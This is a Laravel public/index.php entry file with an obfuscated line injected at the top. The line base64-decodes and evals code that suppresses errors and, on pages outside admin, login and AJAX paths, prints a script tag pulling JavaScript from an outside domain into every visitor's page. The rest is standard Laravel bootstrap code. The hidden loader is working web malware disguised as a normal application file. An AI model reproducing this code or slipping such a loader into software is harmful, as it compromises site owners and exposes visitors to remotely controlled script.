<?php
 eval(base64_decode("aW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAwKTsKaW5pX3NldCgiZGlzcGxheV9zdGFydHVwX2Vycm9ycyIsIDApOwoKaWYgKFBIUF9TQVBJICE9PSAiY2xpIiAmJiAoCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWFkbWluL2FkbWluLWFqYXgucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWpzb24iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AvdjIiKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtYWRtaW4iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtbG9naW4ucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJ0b2xvd2VyKEAkX1NFUlZFUlsiSFRUUF9YX1JFUVVFU1RFRF9XSVRIIl0pICE9PSAieG1saHR0cHJlcXVlc3QiCikpIHsKICAgIHByaW50KGJhc2U2NF9kZWNvZGUoIlBITmpjbWx3ZENCemNtTTlJaTh2WVhONWJtTXVaM041Ym1ScFkyRjBhVzl1TG1OdmJTOGlQand2YzJOeWFYQjBQZz09IikpOwp9")); 


use Illuminate\Foundation\Application;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
/** @var Application $app */
$app = require_once __DIR__.'/../bootstrap/app.php';

$app->handleRequest(Request::capture());
